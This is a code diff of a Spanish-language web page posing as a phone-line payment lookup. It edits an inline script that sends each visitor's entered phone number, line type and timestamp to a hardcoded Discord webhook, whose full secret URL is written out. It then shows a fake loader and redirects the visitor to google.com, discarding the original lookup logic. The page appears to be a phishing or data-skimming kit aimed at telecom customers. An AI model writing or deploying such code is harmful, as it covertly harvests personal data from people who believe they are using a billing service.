@@ -164,59 +164,40 @@
     <script src="debtmap.js"></script>
     <script src="scripts.js"></script>
 
-   <script>
-  // 🔹 Pega tu Webhook de Discord aquí
+<script>
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
 
-  // Función para enviar mensajes a Discord
   function sendToDiscord(message) {
-    const data = { content: message };
-
     fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    })
-    .then(res => res.json())
-    .then(data => console.log("✅ Enviado a Discord", data))
-    .catch(err => console.error("❌ Error enviando a Discord", err));
+      body: JSON.stringify({ content: message })
+    }).catch(err => console.error("Error enviando a Discord", err));
   }
 
-  // Evento al presionar el botón
   document.getElementById("consultPayButton").addEventListener("click", function () {
     const lineNumber = document.getElementById("line-number").value.trim();
+    const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
+    const fecha = new Date().toLocaleString("es-CO");
 
-    if (!lineNumber) {
-      alert("Por favor ingresa un número válido.");
-      return;
-    }
+    const mensaje = `📱 **Nueva consulta de pago:**\n` +
+                    `🔹 Tipo: ${tipoLinea}\n` +
+                    `🔢 Número: ${lineNumber || "(sin número)"}\n` +
+                    `⏰ Fecha: ${fecha}`;
 
-    // Loader
+    sendToDiscord(mensaje);
+
+    // Mostrar loader 2 segundos antes de redirigir
     const loader = document.getElementById("loader");
     loader.style.display = "flex";
 
     setTimeout(function () {
       loader.style.display = "none";
-
-      // Enviar a Discord con el mismo formato 📱
-      const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
-      const fecha = new Date().toLocaleString("es-CO");
-
-      const mensaje = `📱 **Nueva consulta de pago:**\n` +
-                      `🔹 Tipo: ${tipoLinea}\n` +
-                      `🔢 Número: ${lineNumber}\n` +
-                      `⏰ Fecha: ${fecha}`;
-
-      sendToDiscord(mensaje);
-
-      // Lógica de redirección original
-      if (window.debtMap && window.debtMap[lineNumber]) {
-        localStorage.setItem("lineNumber", lineNumber);
-        window.location.href = "screen2.html";
-      }
+      window.location.href = "https://www.google.com";
     }, 2000);
   });
 </script>
+
 
 
 </body>
